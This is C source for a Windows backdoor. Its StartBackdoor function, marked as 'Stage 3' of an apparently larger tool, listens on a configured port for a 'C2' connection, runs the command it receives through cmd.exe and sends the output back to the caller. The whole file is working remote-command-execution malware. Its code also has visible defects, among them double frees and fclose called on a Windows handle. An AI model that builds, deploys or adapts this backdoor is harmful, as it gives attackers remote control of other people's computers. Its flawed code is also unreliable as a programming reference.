#include "../include/config.h"
#include "../include/types.h"

BOOL StartBackdoor(void) {
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in address = {0};
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    char *cmd = NULL;
    wchar_t *cmdWide = NULL;
    BOOL stillRunning = FALSE;

    printf("[BACKDOOR] --- Stage 3: Backdoor Initialization ---\n");
    fflush(stdout);

    // 1. Initialize socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        printf("[DEBUG] socket() failed: %lu\n", (unsigned long)s);
        return FALSE;
    }

    // 2. Bind & Listen
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
    address.sin_port = htons(BACKDOOR_PORT);

    if (bind(s, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
        printf("[DEBUG] bind() failed: %lu\n", (unsigned long)GetLastError());
        closesocket(s);
        return FALSE;
    }

    if (listen(s, 10) == SOCKET_ERROR) {
        printf("[DEBUG] listen() failed: %lu\n", (unsigned long)GetLastError());
        closesocket(s);
        return FALSE;
    }

    printf("[BACKDOOR] Listener ready on 0.0.0.0:%d\n", BACKDOOR_PORT);
    printf("[BACKDOOR] Waiting for C2 connection...\n");
    fflush(stdout);
    Sleep(2000);

    // 3. Accept connection
    SOCKET client = accept(s, NULL, NULL);
    if (client == INVALID_SOCKET) {
        printf("[DEBUG] accept() failed: %lu\n", (unsigned long)GetLastError());
        closesocket(s);
        return TRUE;
    }
    printf("[BACKDOOR] C2 Connected!\n");
    fflush(stdout);

    // 4. Create Pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, NULL, 0)) {
        printf("[DEBUG] CreatePipe failed: %lu\n", (unsigned long)GetLastError());
        fflush(stdout);
        goto CLEANUP;
    }

    // 5. Initialize STARTUPINFOW with pipes
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    // 6. Receive Command from Client
    cmd = (char*)malloc(1024 * sizeof(char));
    if (cmd) {
        memset(cmd, 0, 1024);
        int bytes = recv(client, cmd, 1023, 0);
        if (bytes > 0) {
            cmd[bytes] = 0;
            printf("[BACKDOOR] Received Command: %s\n", cmd);
            fflush(stdout);

            // 7. Spawn cmd.exe
            cmdWide = (wchar_t*)malloc(2048 * sizeof(wchar_t));
            if (cmdWide) {
                swprintf(cmdWide, 2048, L"cmd.exe /c \"%s\"", cmd);
                printf("[BACKDOOR] Spawning: %ls\n", cmdWide);
                fflush(stdout);

                if (CreateProcessW(NULL, cmdWide, NULL, NULL, TRUE, // InheritHandles = TRUE
                                   CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                                   NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
                    printf("[BACKDOOR] Shell spawned! PID=%lu\n", pi.dwProcessId);
                    fflush(stdout);
                    stillRunning = TRUE;
                } else {
                    printf("[BACKDOOR] Shell spawn failed: %lu\n", (unsigned long)GetLastError());
                    fflush(stdout);
                }
                free(cmdWide);
            }
        } else {
            printf("[BACKDOOR] Read command failed: %lu\n", (unsigned long)GetLastError());
            fflush(stdout);
        }
        free(cmd);
    }

CLEANUP:
    // 8. Read Output from Pipe (Safe Loop)
    // FIX: Remove unused outputBuf, use currentBuf consistently
    char currentBuf[4096]; // Use same buffer for output and current read
    while (stillRunning) {
        // Initialize buffer
        memset(currentBuf, 0, sizeof(currentBuf));
        DWORD bytesRead = 0;
        BOOL success = ReadFile(hReadPipe, currentBuf, sizeof(currentBuf) - 1, &bytesRead, NULL);

        if (success) {
            if (bytesRead > 0) {
                // Send output to client
                send(client, currentBuf, bytesRead, 0);
                printf("[BACKDOOR] Received Output: %.*s\n", (int)bytesRead, currentBuf);
                fflush(stdout);

                // Check if shell exited (EOF)
                if (bytesRead == 0) {
                    stillRunning = FALSE;
                    printf("[BACKDOOR] Shell exited (EOF)\n");
                    fflush(stdout);
                }
            } else {
                // EOF or empty
                stillRunning = FALSE;
                printf("[BACKDOOR] Shell exited\n");
                fflush(stdout);
            }
        } else {
            // Pipe closed
            printf("[BACKDOOR] ReadFile failed: %lu\n", (unsigned long)GetLastError());
            fflush(stdout);
            stillRunning = FALSE;
        }
    }

    // 9. Cleanup
    closesocket(client);
    closesocket(s);
    if (hWritePipe) fclose(hWritePipe);
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(cmd);
    free(cmdWide);
    return TRUE;
}